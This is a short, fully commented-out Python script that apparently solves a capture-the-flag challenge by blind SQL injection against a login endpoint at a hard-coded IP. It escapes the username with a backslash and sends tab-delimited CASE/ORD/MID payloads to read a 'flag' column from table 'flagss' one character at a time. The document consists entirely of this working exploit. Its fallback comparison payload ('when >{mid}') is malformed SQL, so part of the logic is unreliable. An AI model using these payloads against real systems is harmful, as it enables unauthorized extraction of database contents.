# import requests 
# import string
# import time

# s = string.printable 
# flag = ''
# url = "http://122.51.52.109:6007/time/"

# def binary_search_character(position):
#     low, high = 32, 126 
#     while low <= high:
#         mid = (low + high) // 2
#         data={'username':'\\','password':f'||case\x09ord(mid((select\x09group_concat(flag)\x09from\x09flagss)\x09from\x09{position}\x09for\x091))\x09when\x09{mid}\x09then\x091\x09else\x090\x09end#'}
#         r = requests.post(url,data=data)
        
#         if "login success" in r.text:
#             return chr(mid)
#         else:
#             data={'username':'\\','password':f'||case\x09ord(mid((select\x09group_concat(flag)\x09from\x09flagss)\x09from\x09{position}\x09for\x091))\x09when\x09>{mid}\x09then\x091\x09else\x090\x09end#'}
#             r = requests.post(url,data=data)
#             if "login success" in r.text:
#                 low = mid + 1

#             else:
#                 high = mid - 1
            
#     return None

# for i in range(1, 40): 
#     print(i)
#     char = binary_search_character(i)
#     print(char)
#     if char:
#         flag += char
#         print(flag)
#     else:
#         break 

# print("Final flag:", flag)